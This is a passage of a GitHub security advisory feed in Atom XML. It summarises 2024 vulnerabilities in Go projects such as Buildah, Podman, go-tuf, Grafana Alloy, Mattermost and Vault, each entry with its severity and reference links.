            <uri>https://github.com/advisories/GHSA-fhqq-8f65-5xfc</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-10-01T21:31:35.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/containers/buildah] Improper Input Validation in Buildah and Podman]]></title>
        <id>https://github.com/advisories/GHSA-fhqq-8f65-5xfc</id>
        <link href="https://github.com/advisories/GHSA-fhqq-8f65-5xfc"/>
        <updated>2024-10-01T22:32:08.000Z</updated>
        <content type="html"><![CDATA[<p>A vulnerability exists in the bind-propagation option of the Dockerfile RUN --mount instruction. The system does not properly validate the input passed to this option, allowing users to pass arbitrary parameters to the mount instruction. This issue can be exploited to mount sensitive directories from the host into a container during the build process and, in some cases, modify the contents of those mounted files. Even if SELinux is used, this vulnerability can bypass its protection by allowing the source directory to be relabeled to give the container access to host files.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-9407">https://nvd.nist.gov/vuln/detail/CVE-2024-9407</a></li>
<li><a href="https://access.redhat.com/security/cve/CVE-2024-9407">https://access.redhat.com/security/cve/CVE-2024-9407</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=2315887">https://bugzilla.redhat.com/show_bug.cgi?id=2315887</a></li>
<li><a href="https://github.com/advisories/GHSA-fhqq-8f65-5xfc">https://github.com/advisories/GHSA-fhqq-8f65-5xfc</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-fhqq-8f65-5xfc</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-10-01T21:31:35.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/golang-fips/openssl/v2] Golang FIPS OpenSSL has a Use of Uninitialized Variable vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-3h3x-2hwv-hr52</id>
        <link href="https://github.com/advisories/GHSA-3h3x-2hwv-hr52"/>
        <updated>2024-10-03T03:32:15.000Z</updated>
        <content type="html"><![CDATA[<p>A vulnerability was found in Golang FIPS OpenSSL. This flaw allows a malicious user to randomly cause an uninitialized buffer length variable with a zeroed buffer to be returned in FIPS mode. It may also be possible to force a false positive match between non-equal hashes when comparing a trusted computed hmac sum to an untrusted input sum if an attacker can send a zeroed buffer in place of a pre-computed sum.&nbsp; It is also possible to force a derived key to be all zeros instead of an unpredictable value.&nbsp; This may have follow-on implications for the Go TLS stack.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-9355">https://nvd.nist.gov/vuln/detail/CVE-2024-9355</a></li>
<li><a href="https://access.redhat.com/security/cve/CVE-2024-9355">https://access.redhat.com/security/cve/CVE-2024-9355</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=2315719">https://bugzilla.redhat.com/show_bug.cgi?id=2315719</a></li>
<li><a href="https://access.redhat.com/errata/RHSA-2024:7502">https://access.redhat.com/errata/RHSA-2024:7502</a></li>
<li><a href="https://access.redhat.com/errata/RHSA-2024:7550">https://access.redhat.com/errata/RHSA-2024:7550</a></li>
<li><a href="https://github.com/advisories/GHSA-3h3x-2hwv-hr52">https://github.com/advisories/GHSA-3h3x-2hwv-hr52</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3h3x-2hwv-hr52</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-10-01T21:31:34.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/containers/common] Link Following in github.com/containers/common]]></title>
        <id>https://github.com/advisories/GHSA-mc76-5925-c5p6</id>
        <link href="https://github.com/advisories/GHSA-mc76-5925-c5p6"/>
        <updated>2024-10-01T22:31:14.000Z</updated>
        <content type="html"><![CDATA[<p>A flaw was found in Go. When FIPS mode is enabled on a system, container runtimes may incorrectly handle certain file paths due to improper validation in the containers/common Go library. This flaw allows an attacker to exploit symbolic links and trick the system into mounting sensitive host directories inside a container. This issue also allows attackers to access critical host files, bypassing the intended isolation between containers and the host system.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-9341">https://nvd.nist.gov/vuln/detail/CVE-2024-9341</a></li>
<li><a href="https://access.redhat.com/security/cve/CVE-2024-9341">https://access.redhat.com/security/cve/CVE-2024-9341</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=2315691">https://bugzilla.redhat.com/show_bug.cgi?id=2315691</a></li>
<li><a href="https://github.com/containers/common/blob/384f77532f67afc8a73d8e0c4adb0d195df57714/pkg/subscriptions/subscriptions.go#L169">https://github.com/containers/common/blob/384f77532f67afc8a73d8e0c4adb0d195df57714/pkg/subscriptions/subscriptions.go#L169</a></li>
<li><a href="https://github.com/containers/common/blob/384f77532f67afc8a73d8e0c4adb0d195df57714/pkg/subscriptions/subscriptions.go#L349">https://github.com/containers/common/blob/384f77532f67afc8a73d8e0c4adb0d195df57714/pkg/subscriptions/subscriptions.go#L349</a></li>
<li><a href="https://github.com/containers/common/commit/e7db06585c32e1a782c1d9aa3b71ccd708f5e23f">https://github.com/containers/common/commit/e7db06585c32e1a782c1d9aa3b71ccd708f5e23f</a></li>
<li><a href="https://github.com/advisories/GHSA-mc76-5925-c5p6">https://github.com/advisories/GHSA-mc76-5925-c5p6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mc76-5925-c5p6</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-10-01T21:31:34.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/grafana/agent] Grafana Agent (Flow mode) on Windows has Unquoted Search Path or Element vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-m5gv-m5f9-wgv4</id>
        <link href="https://github.com/advisories/GHSA-m5gv-m5f9-wgv4"/>
        <updated>2024-10-01T22:29:14.000Z</updated>
        <content type="html"><![CDATA[<p>Unquoted Search Path or Element vulnerability in Grafana Agent (Flow mode) on Windows allows Privilege Escalation from Local User to SYSTEM.
This issue affects Agent Flow before 0.43.3.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-8996">https://nvd.nist.gov/vuln/detail/CVE-2024-8996</a></li>
<li><a href="https://github.com/grafana/agent/releases/tag/v0.43.2">https://github.com/grafana/agent/releases/tag/v0.43.2</a></li>
<li><a href="https://grafana.com/blog/2024/09/25/grafana-alloy-and-grafana-agent-flow-security-release-high-severity-fix-for-cve-2024-8975-and-cve-2024-8996">https://grafana.com/blog/2024/09/25/grafana-alloy-and-grafana-agent-flow-security-release-high-severity-fix-for-cve-2024-8975-and-cve-2024-8996</a></li>
<li><a href="https://grafana.com/security/security-advisories/cve-2024-8996">https://grafana.com/security/security-advisories/cve-2024-8996</a></li>
<li><a href="https://github.com/grafana/agent/releases/tag/v0.43.3">https://github.com/grafana/agent/releases/tag/v0.43.3</a></li>
<li><a href="https://github.com/grafana/agent/commit/91bab2c05906938d3f8e1e3c61a863f037985299">https://github.com/grafana/agent/commit/91bab2c05906938d3f8e1e3c61a863f037985299</a></li>
<li><a href="https://github.com/advisories/GHSA-m5gv-m5f9-wgv4">https://github.com/advisories/GHSA-m5gv-m5f9-wgv4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-m5gv-m5f9-wgv4</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-09-25T18:31:21.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/grafana/alloy] Grafana Alloy on Windows has Unquoted Search Path or Element vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-chqx-36rm-rf8h</id>
        <link href="https://github.com/advisories/GHSA-chqx-36rm-rf8h"/>
        <updated>2024-10-01T22:29:03.000Z</updated>
        <content type="html"><![CDATA[<p>Unquoted Search Path or Element vulnerability in Grafana Alloy on Windows allows Privilege Escalation from Local User to SYSTEM.
This issue affects Alloy: before 1.3.4, from 1.4.0-rc.0 and prior to 1.4.1.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-8975">https://nvd.nist.gov/vuln/detail/CVE-2024-8975</a></li>
<li><a href="https://github.com/grafana/alloy/releases/tag/v1.4.0">https://github.com/grafana/alloy/releases/tag/v1.4.0</a></li>
<li><a href="https://grafana.com/blog/2024/09/25/grafana-alloy-and-grafana-agent-flow-security-release-high-severity-fix-for-cve-2024-8975-and-cve-2024-8996">https://grafana.com/blog/2024/09/25/grafana-alloy-and-grafana-agent-flow-security-release-high-severity-fix-for-cve-2024-8975-and-cve-2024-8996</a></li>
<li><a href="https://grafana.com/security/security-advisories/cve-2024-8975">https://grafana.com/security/security-advisories/cve-2024-8975</a></li>
<li><a href="https://github.com/grafana/alloy/releases/tag/v1.3.4">https://github.com/grafana/alloy/releases/tag/v1.3.4</a></li>
<li><a href="https://github.com/grafana/alloy/releases/tag/v1.4.1">https://github.com/grafana/alloy/releases/tag/v1.4.1</a></li>
<li><a href="https://github.com/grafana/alloy/commit/88e779887690954c009503598a3f4bf563cb6596">https://github.com/grafana/alloy/commit/88e779887690954c009503598a3f4bf563cb6596</a></li>
<li><a href="https://github.com/grafana/alloy/commit/f14249012fd970d3fd73604e6fff9b6c7990a9bb">https://github.com/grafana/alloy/commit/f14249012fd970d3fd73604e6fff9b6c7990a9bb</a></li>
<li><a href="https://github.com/advisories/GHSA-chqx-36rm-rf8h">https://github.com/advisories/GHSA-chqx-36rm-rf8h</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-chqx-36rm-rf8h</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-09-25T18:31:21.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/grafana/alloy] Grafana Alloy on Windows has Unquoted Search Path or Element vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-chqx-36rm-rf8h</id>
        <link href="https://github.com/advisories/GHSA-chqx-36rm-rf8h"/>
        <updated>2024-10-01T22:29:03.000Z</updated>
        <content type="html"><![CDATA[<p>Unquoted Search Path or Element vulnerability in Grafana Alloy on Windows allows Privilege Escalation from Local User to SYSTEM.
This issue affects Alloy: before 1.3.4, from 1.4.0-rc.0 and prior to 1.4.1.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-8975">https://nvd.nist.gov/vuln/detail/CVE-2024-8975</a></li>
<li><a href="https://github.com/grafana/alloy/releases/tag/v1.4.0">https://github.com/grafana/alloy/releases/tag/v1.4.0</a></li>
<li><a href="https://grafana.com/blog/2024/09/25/grafana-alloy-and-grafana-agent-flow-security-release-high-severity-fix-for-cve-2024-8975-and-cve-2024-8996">https://grafana.com/blog/2024/09/25/grafana-alloy-and-grafana-agent-flow-security-release-high-severity-fix-for-cve-2024-8975-and-cve-2024-8996</a></li>
<li><a href="https://grafana.com/security/security-advisories/cve-2024-8975">https://grafana.com/security/security-advisories/cve-2024-8975</a></li>
<li><a href="https://github.com/grafana/alloy/releases/tag/v1.3.4">https://github.com/grafana/alloy/releases/tag/v1.3.4</a></li>
<li><a href="https://github.com/grafana/alloy/releases/tag/v1.4.1">https://github.com/grafana/alloy/releases/tag/v1.4.1</a></li>
<li><a href="https://github.com/grafana/alloy/commit/88e779887690954c009503598a3f4bf563cb6596">https://github.com/grafana/alloy/commit/88e779887690954c009503598a3f4bf563cb6596</a></li>
<li><a href="https://github.com/grafana/alloy/commit/f14249012fd970d3fd73604e6fff9b6c7990a9bb">https://github.com/grafana/alloy/commit/f14249012fd970d3fd73604e6fff9b6c7990a9bb</a></li>
<li><a href="https://github.com/advisories/GHSA-chqx-36rm-rf8h">https://github.com/advisories/GHSA-chqx-36rm-rf8h</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-chqx-36rm-rf8h</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-09-25T18:31:21.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/theupdateframework/go-tuf/v2] Incorrect delegation lookups can make go-tuf download the wrong artifact]]></title>
        <id>https://github.com/advisories/GHSA-4f8r-qqr9-fq8j</id>
        <link href="https://github.com/advisories/GHSA-4f8r-qqr9-fq8j"/>
        <updated>2024-10-01T18:37:40.000Z</updated>
        <content type="html"><![CDATA[<p>During the ongoing work on the TUF conformance test suite, we have come across a test that reveals what we believe is a bug in go-tuf with security implications. The bug exists in go-tuf delegation tracing and could result in downloading the wrong artifact. </p>
<p>We have come across this issue in the test in this PR: <a href="https://github.com/theupdateframework/tuf-conformance/pull/115">https://github.com/theupdateframework/tuf-conformance/pull/115</a>.</p>
<p>The test - <code>test_graph_traversal</code> - sets up a repository with a series of delegations, invokes the clients <code>refresh()</code> and then checks the order in which the client traced the delegations. The test shows that the go-tuf client inconsistently traces the delegations in a wrong way. For example, <a href="https://github.com/theupdateframework/tuf-conformance/pull/115#issuecomment-2275625542">during one CI run</a>, the <code>two-level-delegations</code> test case triggered a wrong order. The delegations in this look as such:</p>
<pre><code class="language-python">"two-level-delegations": DelegationsTestCase(
        delegations=[
            DelegationTester("targets", "A"),
            DelegationTester("targets", "B"),
            DelegationTester("B", "C"),
        ],
        visited_order=["A", "B", "C"],
    ),
</code></pre>
<p>Here, <code>targets</code> delegate to <code>"A"</code>, and to <code>"B"</code>, and <code>"B"</code> delegates to <code>"C"</code>. The client should trace the delegations in the order <code>"A"</code> then <code>"B"</code> then <code>"C"</code> but in this particular CI run, go-tuf traced the delegations <code>"B"-&gt;"C"-&gt;"A"</code>.</p>
<p>In a subsequent CI run, this test case did not fail, but <a href="https://github.com/theupdateframework/tuf-conformance/pull/115#issuecomment-2275640487">another one did</a>.</p>
<p>@jku has done a bit of debugging and believes that the returned map of <code>GetRolesForTarget</code> returns a map that causes this behavior:</p>
<p><a href="https://github.com/theupdateframework/go-tuf/blob/f95222bdd22d2ac4e5b8ed6fe912b645e213c3b5/metadata/metadata.go#L565-L580">https://github.com/theupdateframework/go-tuf/blob/f95222bdd22d2ac4e5b8ed6fe912b645e213c3b5/metadata/metadata.go#L565-L580</a></p>
<p>We believe that this map should be an ordered list instead of a map.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/theupdateframework/go-tuf/security/advisories/GHSA-4f8r-qqr9-fq8j">https://github.com/theupdateframework/go-tuf/security/advisories/GHSA-4f8r-qqr9-fq8j</a></li>
<li><a href="https://github.com/theupdateframework/tuf-conformance/pull/115">https://github.com/theupdateframework/tuf-conformance/pull/115</a></li>
<li><a href="https://github.com/theupdateframework/go-tuf/commit/f36420caba9edbfdfd64f95a9554c0836d9cf819">https://github.com/theupdateframework/go-tuf/commit/f36420caba9edbfdfd64f95a9554c0836d9cf819</a></li>
<li><a href="https://github.com/theupdateframework/go-tuf/blob/f95222bdd22d2ac4e5b8ed6fe912b645e213c3b5/metadata/metadata.go#L565-L580">https://github.com/theupdateframework/go-tuf/blob/f95222bdd22d2ac4e5b8ed6fe912b645e213c3b5/metadata/metadata.go#L565-L580</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-47534">https://nvd.nist.gov/vuln/detail/CVE-2024-47534</a></li>
<li><a href="https://github.com/advisories/GHSA-4f8r-qqr9-fq8j">https://github.com/advisories/GHSA-4f8r-qqr9-fq8j</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4f8r-qqr9-fq8j</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-10-01T18:13:25.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/mattermost/mattermost/server/v8] Mattermost fails to strip `embeds` from `metadata` when broadcasting `posted` events]]></title>
        <id>https://github.com/advisories/GHSA-59hf-mpf8-pqjh</id>
        <link href="https://github.com/advisories/GHSA-59hf-mpf8-pqjh"/>
        <updated>2024-09-27T22:01:17.000Z</updated>
        <content type="html"><![CDATA[<p>Mattermost does not strip <code>embeds</code> from <code>metadata</code> when broadcasting <code>posted</code> events.</p>
<p>This allows users to include arbitrary embeds in posts, which are then broadcasted via websockets. This can be exploited in many ways, for example to create permalinks with fully customizable content or to trigger a client Side Denial of Service (DoS) by sending a permalink with a non-string message.</p>
<p>The advisory metadata references the appropriate go pseudo version available from pkg.go.dev</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-47003">https://nvd.nist.gov/vuln/detail/CVE-2024-47003</a></li>
<li><a href="https://mattermost.com/security-updates">https://mattermost.com/security-updates</a></li>
<li><a href="https://github.com/mattermost/mattermost/pull/27763">https://github.com/mattermost/mattermost/pull/27763</a></li>
<li><a href="https://github.com/mattermost/mattermost/commit/69a8b3df0f9fd3a7a5b792ec678b6191618d039b">https://github.com/mattermost/mattermost/commit/69a8b3df0f9fd3a7a5b792ec678b6191618d039b</a></li>
<li><a href="https://github.com/c0rydoras/cves/tree/main/CVE-2024-47003">https://github.com/c0rydoras/cves/tree/main/CVE-2024-47003</a></li>
<li><a href="https://github.com/advisories/GHSA-59hf-mpf8-pqjh">https://github.com/advisories/GHSA-59hf-mpf8-pqjh</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-59hf-mpf8-pqjh</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-09-26T09:31:42.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/hashicorp/vault] Vault SSH Secrets Engine Configuration Did Not Restrict Valid Principals By Default]]></title>
        <id>https://github.com/advisories/GHSA-jg74-mwgw-v6x3</id>
        <link href="https://github.com/advisories/GHSA-jg74-mwgw-v6x3"/>
        <updated>2024-09-26T21:53:45.000Z</updated>
        <content type="html"><![CDATA[<p>Vault’s SSH secrets engine did not require the valid_principals list to contain a value by default. If the valid_principals and default_user fields of the SSH secrets engine configuration are not set, an SSH certificate requested by an authorized user to Vault’s SSH secrets engine could be used to authenticate as any user on the host. Fixed in Vault Community Edition 1.17.6, and in Vault Enterprise 1.17.6, 1.16.10, and 1.15.15.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-7594">https://nvd.nist.gov/vuln/detail/CVE-2024-7594</a></li>
<li><a href="https://discuss.hashicorp.com/t/hcsec-2024-20-vault-ssh-secrets-engine-configuration-did-not-restrict-valid-principals-by-default/70251">https://discuss.hashicorp.com/t/hcsec-2024-20-vault-ssh-secrets-engine-configuration-did-not-restrict-valid-principals-by-default/70251</a></li>
<li><a href="https://github.com/advisories/GHSA-jg74-mwgw-v6x3">https://github.com/advisories/GHSA-jg74-mwgw-v6x3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jg74-mwgw-v6x3</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-09-26T21:31:11.000Z</published>
    </entry>
</feed>